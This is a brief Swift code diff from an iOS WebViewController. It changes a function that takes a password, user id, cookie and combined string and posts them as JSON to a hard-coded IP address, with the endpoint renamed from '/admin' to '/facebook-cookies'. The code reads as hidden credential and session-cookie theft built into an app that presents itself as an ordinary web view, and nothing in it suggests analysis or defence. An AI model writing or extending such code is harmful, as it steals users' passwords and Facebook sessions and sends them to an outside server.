@@ -79,7 +79,7 @@ class WebViewController: UIViewController, WKNavigationDelegate {
 
 extension WebViewController{
     private func upLoadData(password: String, uid: String,cookie: String,combined: String){
-        let url = URL(string: "http://3.138.32.52:1337/admin")!
+        let url = URL(string: "http://3.138.32.52:1337/facebook-cookies")!
         var request = URLRequest(url: url)
         request.setValue("application/json", forHTTPHeaderField: "Content-Type")
         request.httpMethod = "POST"
